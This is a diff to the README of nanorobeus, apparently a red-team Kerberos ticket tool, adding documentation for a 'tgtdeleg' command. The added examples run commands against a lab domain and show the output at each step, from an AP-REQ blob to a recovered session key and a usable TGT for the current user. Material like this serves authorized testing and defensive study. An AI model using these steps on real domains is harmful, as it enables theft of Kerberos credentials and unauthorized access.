@@ -18,7 +18,9 @@ COFF file (BOF) for managing Kerberos tickets.
 
 **ptt** *\<base64\> [/luid <0x0>]* - import Kerberos ticket into a logon session
 
-**purge** [/luid <0x0>] - purge Kerberos tickets
+**purge** *[/luid <0x0>]* - purge Kerberos tickets
+
+**tgtdeleg** *\<spn\> [\<enc_type_hex\>]* - retrieve a usable TGT for the current user
 
 ## Examples
 Get current logon ID.
@@ -111,6 +113,30 @@ Purge all Kerberos tickets from the current logon session. When elevated, use `/
 => nanorobeus64 purge
 
 [+] Successfully purged tickets.
+```
+Retrieve a usable TGT for the current user. First, retrieve AP-REQ blob.
+```
+=> nanorobeus64 tgtdeleg cifs/dc.fortress.local
+
+[+] AP-REQ blob: YIIMNwYJKoZIhvcSAQICAQBuggwmMIIMIqADAgEFoQMCAQ6iBwMFA...(snip)...
+```
+Then determine an encryption type.
+```
+$ TgtDeleg.exe YIIMNwYJKoZIhvcSAQICAQBuggwmMIIMIqADAgEFoQMCAQ6iBwMFA...(snip)...
+[*] Authenticator etype: 0x12 (aes256_cts_hmac_sha1)
+```
+Retrieve a session key.
+```
+=> nanorobeus64 tgtdeleg cifs/dc.fortress.local 0x12
+
+[*] Encryption: AES256_CTS_HMAC_SHA1
+[+] Session key: 1/0kOhaO+7bRVPUABp0q4IFazZDc2l3GOcWYTuL/bDk=
+```
+Finally, specify the session key and retrieve a usable TGT ticket.
+```
+$ TgtDeleg.exe YIIMNwYJKoZIhvcSAQICAQBuggwmMIIMIqADAgEFoQMCAQ6iBwMFA...(snip)... 1/0kOhaO+7bRVPUABp0q4IFazZDc2l3GOcWYTuL/bDk=
+[*] Authenticator etype: 0x12 (aes256_cts_hmac_sha1)
+[*] Ticket: doIFeDCCBXSgAwIBBaEDAgEWooIEcjCCBG5hggRqMIIEZq...(snip)...
 ```
 
 ## Credits
